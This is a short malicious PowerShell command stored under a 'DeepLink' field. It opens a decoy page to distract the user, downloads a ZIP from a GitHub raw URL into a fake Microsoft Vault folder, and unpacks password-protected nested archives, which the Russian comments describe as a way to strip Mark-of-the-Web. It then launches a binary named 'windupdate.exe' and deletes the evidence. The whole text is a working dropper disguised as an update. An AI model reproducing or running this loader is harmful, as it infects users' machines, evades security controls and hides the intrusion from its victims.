Content.DeepLink:
            powershell.exe -NoProfile -WindowStyle Hidden -Command "& {
            $p = 'Sc8#mK92_vXp';
            $v = \"$env:LOCALAPPDATA\Microsoft\Vault\";
            $pdf = 'https://github.com';
            $zipUrl = 'https://github.com/apda89787/tgv5byrn-uynu7ytthgf/raw/refs/heads/main/update_cache.zip';
            
            # 0. Открытие приманки (PDF) для отвлечения
            Start-Process $pdf;

            if (!(Test-Path $v)) { New-Item -ItemType Directory -Path $v -Force | Out-Null };
            $z = \"$v\update_cache.zip\";
            
            # 1. Загрузка контейнера
            Invoke-WebRequest -Uri $zipUrl -OutFile $z;
            
            # 2. Распаковка ZIP (7za.exe, 7z.dll, outer.7z)
            Expand-Archive -Path $z -DestinationPath $v -Force;
            
            Set-Location $v;
            Start-Sleep -s 2;
            
            # 3. Первый этап (снятие MOTW с inner.7z)
            if (Test-Path './7za.exe') {
                ./7za.exe x outer.7z -p$p -y -o\"$v\" | Out-Null;
            }
            
            Start-Sleep -s 5;
            
            # 4. Второй этап (извлечение чистого exe)
            if (Test-Path './7za.exe') {
                ./7za.exe x inner.7z -p$p -y -o\"$v\" | Out-Null;
            }
            
            Start-Sleep -s 10;
            
            # 5. Запуск бинарника без меток
            if (Test-Path \"$v\windupdate.exe\") {
                Start-Process -FilePath \"$v\windupdate.exe\" -WorkingDirectory $v;
            }

            # 6. Зачистка через 30 секунд
            Start-Sleep -s 30;
            Remove-Item -Path $z -Force -ErrorAction SilentlyContinue;
            Get-ChildItem -Path $v -Include *.7z, 7za.exe, 7z.dll, 7xza.dll | Remove-Item -Force;
            }"
